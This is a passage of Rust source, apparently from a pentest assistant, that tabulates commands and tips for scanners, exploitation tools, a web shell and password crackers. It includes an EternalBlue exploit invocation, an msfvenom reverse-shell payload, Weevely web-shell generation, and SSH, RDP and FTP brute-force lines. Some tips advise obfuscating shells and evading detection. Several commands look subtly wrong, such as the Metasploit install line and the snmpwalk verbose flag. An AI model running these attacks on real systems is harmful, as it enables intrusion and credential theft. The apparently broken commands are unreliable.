                    command: "snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1".to_string(),
                },
                ToolExample {
                    description: "Verbose output with retries".to_string(),
                    command: "snmpwalk -v2c -c public -v -r 3 192.168.1.1".to_string(),
                },
                ToolExample {
                    description: "Walk all OIDs".to_string(),
                    command: "snmpwalk -v2c -c public 192.168.1.1 .1".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-v".to_string(), description: "SNMP version (1, 2c, 3)".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Community string".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Number of retries".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Timeout in seconds".to_string() },
                ToolFlag { flag: "-m".to_string(), description: "Load MIB modules".to_string() },
                ToolFlag { flag: "-On".to_string(), description: "Print OIDs numerically".to_string() },
                ToolFlag { flag: "-Os".to_string(), description: "Print only last symbolic part".to_string() },
            ],
            tips: vec![
                "Try common community strings like 'public', 'private', 'cisco'.",
                "Use version 1 for older devices, 2c for modern ones.",
                "Save output for analysis of device configuration.",
                "Combine with SNMP brute force tools for discovery.",
            ],
        },
        "onesixtyone" => ToolInstructions {
            name: "Onesixtyone".to_string(),
            description: "Onesixtyone is an SNMP scanner that sends SNMP requests to multiple IP addresses, trying different community strings.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install onesixtyone",
                "",
                "# Install from source",
                "git clone https://github.com/trailofbits/onesixtyone.git",
                "cd onesixtyone",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic SNMP scan".to_string(),
                    command: "onesixtyone 192.168.1.1".to_string(),
                },
                ToolExample {
                    description: "Scan with custom community strings".to_string(),
                    command: "onesixtyone -c community.txt 192.168.1.0/24".to_string(),
                },
                ToolExample {
                    description: "Fast scan with output file".to_string(),
                    command: "onesixtyone -o results.txt -w wordlist.txt 192.168.1.0/24".to_string(),
                },
                ToolExample {
                    description: "Verbose scanning".to_string(),
                    command: "onesixtyone -v -d 192.168.1.1".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-c".to_string(), description: "Community strings file".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose mode".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Debug mode".to_string() },
                ToolFlag { flag: "-i".to_string(), description: "Input file with hosts".to_string() },
            ],
            tips: vec![
                "Use comprehensive community string wordlists.",
                "Scan in batches to avoid overwhelming networks.",
                "Save results for follow-up SNMP enumeration.",
                "Combine with detailed SNMPwalk on discovered devices.",
            ],
        },
        // Vulnerability Analysis Tools
        "sslyze" => ToolInstructions {
            name: "SSLyze".to_string(),
            description: "SSLyze is a powerful Python tool that can analyze the SSL configuration of a server by connecting to it and identifying any weaknesses.",
            installation: vec![
                "# Install from pip",
                "pip3 install sslyze",
                "",
                "# Install from source",
                "git clone https://github.com/nabla-c0d3/sslyze.git",
                "cd sslyze",
                "pip3 install -r requirements.txt",
                "python3 sslyze --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic SSL scan".to_string(),
                    command: "python3 sslyze --regular example.com".to_string(),
                },
                ToolExample {
                    description: "Scan specific port".to_string(),
                    command: "python3 sslyze --regular example.com:8443".to_string(),
                },
                ToolExample {
                    description: "Heartbleed check".to_string(),
                    command: "python3 sslyze --heartbleed example.com".to_string(),
                },
                ToolExample {
                    description: "Save results to JSON".to_string(),
                    command: "python3 sslyze --json_out results.json example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--regular".to_string(), description: "Run regular scan suite".to_string() },
                ToolFlag { flag: "--heartbleed".to_string(), description: "Check for Heartbleed vulnerability".to_string() },
                ToolFlag { flag: "--openssl_ccs".to_string(), description: "Check for OpenSSL CCS injection".to_string() },
                ToolFlag { flag: "--session_resumption".to_string(), description: "Test session resumption".to_string() },
                ToolFlag { flag: "--json_out".to_string(), description: "Save results to JSON file".to_string() },
                ToolFlag { flag: "--xml_out".to_string(), description: "Save results to XML file".to_string() },
            ],
            tips: vec![
                "Use --regular for comprehensive vulnerability scanning.",
                "Scan multiple ports for complete SSL coverage.",
                "Save results for documentation and reporting.",
                "Combine with other SSL tools for thorough analysis.",
            ],
        },
        "testssl" => ToolInstructions {
            name: "TestSSL.sh".to_string(),
            description: "TestSSL.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as cryptographic flaws.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/drwetter/testssl.sh.git",
                "cd testssl.sh",
                "chmod +x testssl.sh",
                "./testssl.sh --help",
                "",
                "# Kali Linux (pre-installed)",
                "testssl.sh",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic SSL/TLS test".to_string(),
                    command: "./testssl.sh example.com".to_string(),
                },
                ToolExample {
                    description: "Test specific port".to_string(),
                    command: "./testssl.sh example.com:8443".to_string(),
                },
                ToolExample {
                    description: "Test only protocols".to_string(),
                    command: "./testssl.sh --protocols example.com".to_string(),
                },
                ToolExample {
                    description: "Generate HTML report".to_string(),
                    command: "./testssl.sh --htmlfile report.html example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--protocols".to_string(), description: "Check TLS/SSL protocols".to_string() },
                ToolFlag { flag: "--cipher".to_string(), description: "Check cipher suites".to_string() },
                ToolFlag { flag: "--vulnerable".to_string(), description: "Test for vulnerabilities".to_string() },
                ToolFlag { flag: "--htmlfile".to_string(), description: "Generate HTML report".to_string() },
                ToolFlag { flag: "--jsonfile".to_string(), description: "Generate JSON report".to_string() },
                ToolFlag { flag: "--quiet".to_string(), description: "Reduce output verbosity".to_string() },
                ToolFlag { flag: "--fast".to_string(), description: "Fast scan mode".to_string() },
            ],
            tips: vec![
                "Use HTML reports for professional documentation.",
                "Fast mode is good for initial assessments.",
                "Test all ports that use SSL/TLS for complete coverage.",
                "Document findings for remediation tracking.",
            ],
        },
        "wpscan" => ToolInstructions {
            name: "WPScan".to_string(),
            description: "WPScan is a black box WordPress vulnerability scanner written in Ruby that can be used to scan WordPress installations for security issues.",
            installation: vec![
                "# Install from gem",
                "gem install wpscan",
                "",
                "# Install from source",
                "git clone https://github.com/wpscanteam/wpscan.git",
                "cd wpscan",
                "bundle install && rake install",
                "",
                "# Docker",
                "docker run -it --rm wpscanteam/wpscan --url https://example.com",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic WordPress scan".to_string(),
                    command: "wpscan --url https://example.com".to_string(),
                },
                ToolExample {
                    description: "Enumerate users".to_string(),
                    command: "wpscan --url https://example.com --enumerate u".to_string(),
                },
                ToolExample {
                    description: "Plugin enumeration".to_string(),
                    command: "wpscan --url https://example.com --enumerate p".to_string(),
                },
                ToolExample {
                    description: "Password attack".to_string(),
                    command: "wpscan --url https://example.com --passwords wordlist.txt --usernames admin".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--url".to_string(), description: "Target WordPress URL".to_string() },
                ToolFlag { flag: "--enumerate".to_string(), description: "Enumeration options".to_string() },
                ToolFlag { flag: "--plugins-detection".to_string(), description: "Plugin detection mode".to_string() },
                ToolFlag { flag: "--passwords".to_string(), description: "Password list for brute force".to_string() },
                ToolFlag { flag: "--usernames".to_string(), description: "Username list for brute force".to_string() },
                ToolFlag { flag: "--api-token".to_string(), description: "WPVulnDB API token".to_string() },
                ToolFlag { flag: "--output".to_string(), description: "Output file".to_string() },
            ],
            tips: vec![
                "Use API token for up-to-date vulnerability database.",
                "Enumerate users first, then attempt password attacks.",
                "Save results for later analysis and reporting.",
                "Be careful with brute force attempts to avoid lockouts.",
            ],
        },
        "joomscan" => ToolInstructions {
            name: "Joomscan".to_string(),
            description: "Joomscan is a Joomla vulnerability scanner that can detect vulnerabilities, misconfigurations, and security issues in Joomla installations.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install joomscan",
                "",
                "# Install from source",
                "git clone https://github.com/rezasp/joomscan.git",
                "cd joomscan",
                "chmod +x joomscan.pl",
                "sudo perl joomscan.pl update",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic Joomla scan".to_string(),
                    command: "joomscan -u https://example.com".to_string(),
                },
                ToolExample {
                    description: "Scan with cookie".to_string(),
                    command: "joomscan -u https://example.com -c 'session=abc123'".to_string(),
                },
                ToolExample {
                    description: "Check for specific Joomla version".to_string(),
                    command: "joomscan -u https://example.com --check-version".to_string(),
                },
                ToolExample {
                    description: "Save scan results".to_string(),
                    command: "joomscan -u https://example.com -o results.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Target Joomla URL".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Cookie string".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Proxy server".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "--check-version".to_string(), description: "Check Joomla version".to_string() },
                ToolFlag { flag: "--random-agent".to_string(), description: "Use random user agent".to_string() },
                ToolFlag { flag: "--follow-redirect".to_string(), description: "Follow HTTP redirects".to_string() },
            ],
            tips: vec![
                "Update database regularly for latest signatures.",
                "Use cookies to scan authenticated areas.",
                "Check version against known vulnerabilities.",
                "Document all findings for remediation.",
            ],
        },
        "nuclei" => ToolInstructions {
            name: "Nuclei".to_string(),
            description: "Nuclei is a fast and customizable vulnerability scanner based on simple YAML based DSL that enables you to detect vulnerabilities in misconfigurations.",
            installation: vec![
                "# Install from source",
                "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
                "",
                "# Download pre-compiled binary",
                "# https://github.com/projectdiscovery/nuclei/releases",
                "",
                "# Update templates",
                "nuclei -update-templates",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic vulnerability scan".to_string(),
                    command: "nuclei -u https://example.com".to_string(),
                },
                ToolExample {
                    description: "Scan with specific template".to_string(),
                    command: "nuclei -u https://example.com -id CVE-2021-44228".to_string(),
                },
                ToolExample {
                    description: "Scan multiple targets".to_string(),
                    command: "nuclei -l targets.txt -severity critical,high".to_string(),
                },
                ToolExample {
                    description: "Scan with custom templates".to_string(),
                    command: "nuclei -u https://example.com -t custom_templates/".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Target URL".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "File with target URLs".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Template directory or file".to_string() },
                ToolFlag { flag: "-id".to_string(), description: "Specific template ID".to_string() },
                ToolFlag { flag: "-severity".to_string(), description: "Filter by severity level".to_string() },
                ToolFlag { flag: "-json".to_string(), description: "JSON output format".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-rate-limit".to_string(), description: "Requests per second".to_string() },
            ],
            tips: vec![
                "Keep templates updated for latest vulnerability checks.",
                "Use severity filters to focus on critical findings.",
                "Create custom templates for organization-specific checks.",
                "Combine with other scanners for comprehensive coverage.",
            ],
        },
        "lynis" => ToolInstructions {
            name: "Lynis".to_string(),
            description: "Lynis is a security auditing tool for UNIX derivatives like Linux, macOS, BSD, Solaris, AIX, and others.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install lynis",
                "",
                "# Install from source",
                "git clone https://github.com/CISOfy/lynis.git",
                "cd lynis",
                "chmod +x lynis",
                "",
                "# Run from directory",
                "./lynis audit system",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Full system audit".to_string(),
                    command: "lynis audit system".to_string(),
                },
                ToolExample {
                    description: "Scan specific directory".to_string(),
                    command: "lynis audit system --scan-dir /opt/app".to_string(),
                },
                ToolExample {
                    description: "Quick scan with warnings only".to_string(),
                    command: "lynis audit system --quick --warnings-only".to_string(),
                },
                ToolExample {
                    description: "Generate HTML report".to_string(),
                    command: "lynis audit system --report-file /tmp/lynis-report.html".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "audit system".to_string(), description: "Perform full system audit".to_string() },
                ToolFlag { flag: "--scan-dir".to_string(), description: "Scan specific directory".to_string() },
                ToolFlag { flag: "--quick".to_string(), description: "Quick scan mode".to_string() },
                ToolFlag { flag: "--warnings-only".to_string(), description: "Show only warnings".to_string() },
                ToolFlag { flag: "--report-file".to_string(), description: "Output report file".to_string() },
                ToolFlag { flag: "--tests".to_string(), description: "Run specific tests".to_string() },
                ToolFlag { flag: "--check-all".to_string(), description: "Check all tests".to_string() },
            ],
            tips: vec![
                "Run as root for comprehensive system access.",
                "Review warnings and suggestions for hardening.",
                "Create baseline scans for change detection.",
                "Document findings for security compliance.",
            ],
        },
        "unix-privesc-check" => ToolInstructions {
            name: "Unix-Privesc-Check".to_string(),
            description: "Unix-Privesc-Check is a script to check for common privilege escalation vectors on Unix/Linux systems.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/pentestmonkey/unix-privesc-check.git",
                "cd unix-privesc-check",
                "chmod +x unix-privesc-check",
                "./unix-privesc-check --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic privilege escalation check".to_string(),
                    command: "./unix-privesc-check".to_string(),
                },
                ToolExample {
                    description: "Detailed verbose output".to_string(),
                    command: "./unix-privesc-check -v".to_string(),
                },
                ToolExample {
                    description: "Check specific directory".to_string(),
                    command: "./unix-privesc-check -d /home/user".to_string(),
                },
                ToolExample {
                    description: "Save results to file".to_string(),
                    command: "./unix-privesc-check -o results.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Check specific directory".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Test mode".to_string() },
                ToolFlag { flag: "-h".to_string(), description: "Show help".to_string() },
            ],
            tips: vec![
                "Run as different users for comprehensive coverage.",
                "Document all potential privilege escalation paths.",
                "Combine with manual verification of findings.",
                "Use results for system hardening recommendations.",
            ],
        },
        // Exploitation Tools
        "metasploit" => ToolInstructions {
            name: "Metasploit Framework".to_string(),
            description: "Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploits against remote targets.",
            installation: vec![
                "# Install from installer",
                "curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/config/.metasploit-framework -o /usr/local/bin/msfconsole",
                "chmod +x /usr/local/bin/msfconsole",
                "",
                "# Docker",
                "docker run -it --rm metasploitframework/metasploit-framework",
                "",
                "# Kali Linux (pre-installed)",
                "msfconsole",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Launch Metasploit console".to_string(),
                    command: "msfconsole".to_string(),
                },
                ToolExample {
                    description: "Search for exploits".to_string(),
                    command: "msfconsole -q -x 'search eternalblue'".to_string(),
                },
                ToolExample {
                    description: "Use specific exploit".to_string(),
                    command: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit'".to_string(),
                },
                ToolExample {
                    description: "Generate payload".to_string(),
                    command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-q".to_string(), description: "Quiet mode".to_string() },
                ToolFlag { flag: "-x".to_string(), description: "Execute commands".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Resource script file".to_string() },
                ToolFlag { flag: "-E".to_string(), description: "Environment variables".to_string() },
                ToolFlag { flag: "-y".to_string(), description: "Answer yes to prompts".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Architecture".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Platform".to_string() },
            ],
            tips: vec![
                "Keep database updated for latest exploits.",
                "Use resource scripts for automated workflows.",
                "Document all exploitation attempts and results.",
                "Be aware of legal and ethical considerations.",
            ],
        },
        "searchsploit" => ToolInstructions {
            name: "SearchSploit".to_string(),
            description: "SearchSploit is a command line search tool for Exploit-DB, allowing you to search through exploit database quickly.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install exploitdb",
                "",
                "# Install from git",
                "git clone https://github.com/offensive-security/exploitdb.git",
                "cd exploitdb",
                "./searchsploit --help",
                "",
                "# Update database",
                "searchsploit -u",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Search for Apache exploits".to_string(),
                    command: "searchsploit apache".to_string(),
                },
                ToolExample {
                    description: "Search with specific terms".to_string(),
                    command: "searchsploit -t web -p linux kernel".to_string(),
                },
                ToolExample {
                    description: "Copy exploit to current directory".to_string(),
                    command: "searchsploit -m 44918".to_string(),
                },
                ToolExample {
                    description: "Search by CVE".to_string(),
                    command: "searchsploit CVE-2021-44228".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Update exploit database".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Search by title".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Platform filter".to_string() },
                ToolFlag { flag: "-m".to_string(), description: "Copy exploit to current directory".to_string() },
                ToolFlag { flag: "-x".to_string(), description: "Exclude exploits".to_string() },
                ToolFlag { flag: "-n".to_string(), description: "Non-interactive mode".to_string() },
                ToolFlag { flag: "-j".to_string(), description: "JSON output".to_string() },
            ],
            tips: vec![
                "Update database regularly for latest exploits.",
                "Use specific terms for better search results.",
                "Verify exploit applicability before use.",
                "Document exploit sources for attribution.",
            ],
        },
        "commix" => ToolInstructions {
            name: "Commix".to_string(),
            description: "Commix is an automated all-in-one OS command injection and exploitation tool that can be used by web developers, penetration testers, and security researchers.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/commixproject/commix.git",
                "cd commix",
                "pip3 install -r requirements.txt",
                "python3 commix.py --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic command injection test".to_string(),
                    command: "python3 commix.py -u 'https://example.com/page.php?id=1'".to_string(),
                },
                ToolExample {
                    description: "Test POST request".to_string(),
                    command: "python3 commix.py -u 'https://example.com/login.php' --data='user=test&pass=test'".to_string(),
                },
                ToolExample {
                    description: "Use cookie for authentication".to_string(),
                    command: "python3 commix.py -u 'https://example.com/page.php?id=1' --cookie='session=abc123'".to_string(),
                },
                ToolExample {
                    description: "Test with custom user agent".to_string(),
                    command: "python3 commix.py -u 'https://example.com/page.php?id=1' --user-agent='Custom Browser 1.0'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Target URL".to_string() },
                ToolFlag { flag: "--data".to_string(), description: "POST data".to_string() },
                ToolFlag { flag: "--cookie".to_string(), description: "HTTP cookie".to_string() },
                ToolFlag { flag: "--user-agent".to_string(), description: "Custom user agent".to_string() },
                ToolFlag { flag: "--proxy".to_string(), description: "Proxy server".to_string() },
                ToolFlag { flag: "--batch".to_string(), description: "Batch mode (no interaction)".to_string() },
                ToolFlag { flag: "--level".to_string(), description: "Test level (1-3)".to_string() },
                ToolFlag { flag: "--risk".to_string(), description: "Risk level (1-3)".to_string() },
            ],
            tips: vec![
                "Use batch mode for automated testing.",
                "Test with different injection techniques.",
                "Document all command injection findings.",
                "Be careful with payload execution on production systems.",
            ],
        },
        "weevely" => ToolInstructions {
            name: "Weevely".to_string(),
            description: "Weevely is a stealthy web shell that provides an SSH-like terminal on web servers and can be used for post-exploitation tasks.",
            installation: vec![
                "# Install from pip",
                "pip3 install weevely",
                "",
                "# Install from source",
                "git clone https://github.com/epinna/weevely3.git",
                "cd weevely3",
                "pip3 install -r requirements.txt",
                "python3 weevely.py --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Generate web shell".to_string(),
                    command: "weevely generate password /tmp/shell.php".to_string(),
                },
                ToolExample {
                    description: "Connect to web shell".to_string(),
                    command: "weevely http://example.com/uploads/shell.php password".to_string(),
                },
                ToolExample {
                    description: "Generate obfuscated shell".to_string(),
                    command: "weevely generate password /tmp/shell.php -obfuscator 2".to_string(),
                },
                ToolExample {
                    description: "Execute command on target".to_string(),
                    command: "# After connecting: :shell ls -la".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "generate".to_string(), description: "Generate web shell".to_string() },
                ToolFlag { flag: "-obfuscator".to_string(), description: "Obfuscation level".to_string() },
                ToolFlag { flag: ":shell".to_string(), description: "Execute shell command".to_string() },
                ToolFlag { flag: ":file_upload".to_string(), description: "Upload file".to_string() },
                ToolFlag { flag: ":file_download".to_string(), description: "Download file".to_string() },
                ToolFlag { flag: ":audit_asp".to_string(), description: "Audit ASP files".to_string() },
                ToolFlag { flag: ":audit_php".to_string(), description: "Audit PHP files".to_string() },
            ],
            tips: vec![
                "Use strong passwords for shell protection.",
                "Obfuscate shells to avoid detection.",
                "Clean up shell files after use.",
                "Document all post-exploitation activities.",
            ],
        },
        "medusa" => ToolInstructions {
            name: "Medusa".to_string(),
            description: "Medusa is a speedy, parallel, and modular login brute forcer. It supports many protocols and services.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install medusa",
                "",
                "# Install from source",
                "git clone https://github.com/jmk-foofus/medusa.git",
                "cd medusa",
                "./configure && make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "SSH brute force".to_string(),
                    command: "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh".to_string(),
                },
                ToolExample {
                    description: "FTP brute force with multiple users".to_string(),
                    command: "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp".to_string(),
                },
                ToolExample {
                    description: "HTTP basic auth".to_string(),
                    command: "medusa -h https://example.com -u admin -P passwords.txt -M http".to_string(),
                },
                ToolExample {
                    description: "RDP brute force".to_string(),
                    command: "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M rdp".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-h".to_string(), description: "Target host".to_string() },
                ToolFlag { flag: "-u/-U".to_string(), description: "Username or user file".to_string() },
                ToolFlag { flag: "-p/-P".to_string(), description: "Password or password file".to_string() },
                ToolFlag { flag: "-M".to_string(), description: "Module name".to_string() },
                ToolFlag { flag: "-m".to_string(), description: "Module options".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Stop on successful login".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
            ],
            tips: vec![
                "Use appropriate thread counts to avoid detection.",
                "Combine with good wordlists for better success rates.",
                "Stop on success to reduce noise after finding credentials.",
                "Document all successful authentication attempts.",
            ],
        },
        "ncrack" => ToolInstructions {
            name: "NCrack".to_string(),
            description: "NCrack is a high-speed network authentication cracking tool that supports many protocols.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install ncrack",
                "",
                "# Install from source",
                "git clone https://github.com/nmap/ncrack.git",
                "cd ncrack",
                "./configure && make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "SSH brute force".to_string(),
                    command: "ncrack -p 22 --user admin -P passwords.txt 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "RDP cracking".to_string(),
                    command: "ncrack -p 3389 --user admin -P passwords.txt 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "Multiple protocols".to_string(),
                    command: "ncrack -p ssh:22,rdp:3389 --user admin -P passwords.txt 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "HTTP basic auth".to_string(),
                    command: "ncrack -p http --user admin -P passwords.txt https://example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-p".to_string(), description: "Port and protocol".to_string() },
                ToolFlag { flag: "--user".to_string(), description: "Username".to_string() },
                ToolFlag { flag: "-P".to_string(), description: "Password file".to_string() },
                ToolFlag { flag: "-U".to_string(), description: "Username file".to_string() },
                ToolFlag { flag: "-T".to_string(), description: "Timing template".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Stop when found".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
            ],
            tips: vec![
                "Use timing templates to balance speed and stealth.",
                "Focus on high-value targets for authentication testing.",
                "Document all discovered credentials securely.",
                "Be aware of account lockout policies.",
            ],
        },
        "patator" => ToolInstructions {
            name: "Patator".to_string(),
            description: "Patator is a multi-purpose brute-forcer that supports many protocols and services with a modular design.",
            installation: vec![
                "# Install from pip",
                "pip3 install patator",
                "",
                "# Install from source",
                "git clone https://github.com/lanjelot/patator.git",
                "cd patator",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "SSH brute force".to_string(),
                    command: "patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt".to_string(),
                },
                ToolExample {
                    description: "HTTP form brute force".to_string(),
                    command: "patator http_fuzz url=https://example.com/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=/path/to/users.txt 1=/path/to/passwords.txt".to_string(),
                },
                ToolExample {
                    description: "FTP brute force".to_string(),
                    command: "patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt".to_string(),
                },
                ToolExample {
                    description: "Dictionary attack on URL".to_string(),
                    command: "patator http_fuzz url=https://example.com/FUZZ 0=/path/to/wordlist.txt -x ignore:code=404".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "ssh_login".to_string(), description: "SSH login module".to_string() },
                ToolFlag { flag: "http_fuzz".to_string(), description: "HTTP fuzzing module".to_string() },
                ToolFlag { flag: "ftp_login".to_string(), description: "FTP login module".to_string() },
                ToolFlag { flag: "-x".to_string(), description: "Filter results".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Log file".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Threads".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Delay between requests".to_string() },
            ],
            tips: vec![
                "Use filters to reduce noise and focus on relevant results.",
                "Adjust thread count to balance speed and detection.",
                "Log all attempts for analysis and documentation.",
                "Test with different payload combinations.",
            ],
        },
        "john" => ToolInstructions {
            name: "John the Ripper".to_string(),
            description: "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install john",
                "",
                "# Install from source",
                "git clone https://github.com/openwall/john.git",
                "cd john/src",
                "./configure && make && sudo make install",
                "",
                "# John the Ripper Pro (enhanced)",
                "# Purchase from https://www.openwall.com/john/",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic password cracking".to_string(),
                    command: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt".to_string(),
                },
                ToolExample {
                    description: "Show cracked passwords".to_string(),
                    command: "john --show hash.txt".to_string(),
                },
                ToolExample {
                    description: "Use specific format".to_string(),
                    command: "john --format=raw-md5 --wordlist=wordlist.txt hash.txt".to_string(),
                },
                ToolExample {
                    description: "Incremental mode attack".to_string(),
                    command: "john --incremental hash.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--wordlist".to_string(), description: "Dictionary attack".to_string() },
                ToolFlag { flag: "--incremental".to_string(), description: "Incremental mode".to_string() },
                ToolFlag { flag: "--format".to_string(), description: "Specify hash format".to_string() },
                ToolFlag { flag: "--show".to_string(), description: "Show cracked passwords".to_string() },
                ToolFlag { flag: "--rules".to_string(), description: "Apply word mangling rules".to_string() },
                ToolFlag { flag: "--single".to_string(), description: "Single crack mode".to_string() },
                ToolFlag { flag: "--mask".to_string(), description: "Mask attack mode".to_string() },
            ],
            tips: vec![
                "Use wordlists for initial dictionary attacks.",
                "Apply rules for better password variations.",
                "Try different formats based on hash type.",
                "Save cracked passwords securely for later use.",
            ],
        },
        "hashcat" => ToolInstructions {
            name: "Hashcat".to_string(),
            description: "Hashcat is the world's fastest password cracker, supporting hundreds of hash types with GPU acceleration.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install hashcat",
                "",
                "# Install from source",
                "git clone https://github.com/hashcat/hashcat.git",
                "cd hashcat",
                "make && sudo make install",
                "",
                "# Download pre-compiled binary",
                "# https://hashcat.net/hashcat/",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic hash cracking".to_string(),
                    command: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt".to_string(),
                },
                ToolExample {
                    description: "Show cracked passwords".to_string(),
                    command: "hashcat -m 0 hash.txt --show".to_string(),
                },
                ToolExample {
                    description: "Mask attack".to_string(),
                    command: "hashcat -m 0 -a 3 hash.txt ?u?l?d?d?d?d".to_string(),
                },
                ToolExample {
                    description: "Rule-based attack".to_string(),
                    command: "hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-m".to_string(), description: "Hash type".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Attack mode".to_string() },
